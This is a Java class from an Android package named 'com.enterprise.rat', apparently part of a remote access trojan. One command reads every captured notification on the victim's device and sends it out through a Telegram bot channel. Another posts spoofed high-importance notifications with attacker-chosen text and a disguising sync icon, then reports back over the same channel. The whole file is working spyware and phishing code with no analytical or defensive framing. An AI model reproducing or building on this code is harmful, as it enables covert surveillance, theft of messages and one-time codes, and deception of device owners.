package com.enterprise.rat.commands;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import androidx.core.app.NotificationCompat;
import com.enterprise.rat.R;
import com.enterprise.rat.services.NotificationService;
import com.enterprise.rat.utils.TelegramApi;

public class NotificationManager {
    public static void dumpNotifications() {
        NotificationService svc = NotificationService.getInstance();
        if (svc != null) {
            String data = svc.dumpAllNotifications();
            TelegramApi.sendMessage(data.isEmpty() ? "🔔 No active notifications" : "<b>🔔 Notifications:</b>\n" + data);
        } else TelegramApi.sendMessage("❌ Service inactive");
    }

    public static void sendFake(Context context, String title, String text) {
        String channelId = "fake_notif";
        android.app.NotificationManager nm = (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            nm.createNotificationChannel(new NotificationChannel(channelId, "Fake", android.app.NotificationManager.IMPORTANCE_HIGH));
        }
        Intent i = new Intent(context, com.enterprise.rat.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(context, 0, i, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        Notification notif = new NotificationCompat.Builder(context, channelId)
                .setContentTitle(title).setContentText(text).setSmallIcon(R.drawable.ic_sync).setContentIntent(pi).setAutoCancel(true).build();
        nm.notify(9999, notif);
        TelegramApi.sendMessage("🔔 Fake notification sent");
    }
}
